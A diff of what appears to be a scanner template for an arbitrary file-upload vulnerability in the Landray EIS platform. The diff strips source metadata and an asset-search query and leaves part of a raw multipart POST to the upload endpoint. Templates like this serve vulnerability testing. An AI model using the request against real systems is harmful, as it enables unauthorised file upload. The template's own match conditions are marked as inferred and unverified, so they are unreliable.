@@ -3,14 +3,8 @@ info:
   name: 蓝凌EIS智慧协同平台frm接口任意文件上传
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/15c9e321adee00585b2f483a9b59e46a
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 15c9e321adee00585b2f483a9b59e46a
-    fofa: + hunter`app.name="Landray 蓝凌 EIS智慧协同平台"`
 http:
 - raw:
   - 'POST /frm/frm_form_upload.aspx HTTP/1.1
@@ -39,7 +33,6 @@ http:
     -----------------------------mlypec5g19dgkcuhmmmw
 
     Content-Disposition: form-data; name="__VIEWSTATE"
-
 
 
     -----------------------------mlypec5g19dgkcuhmmmw
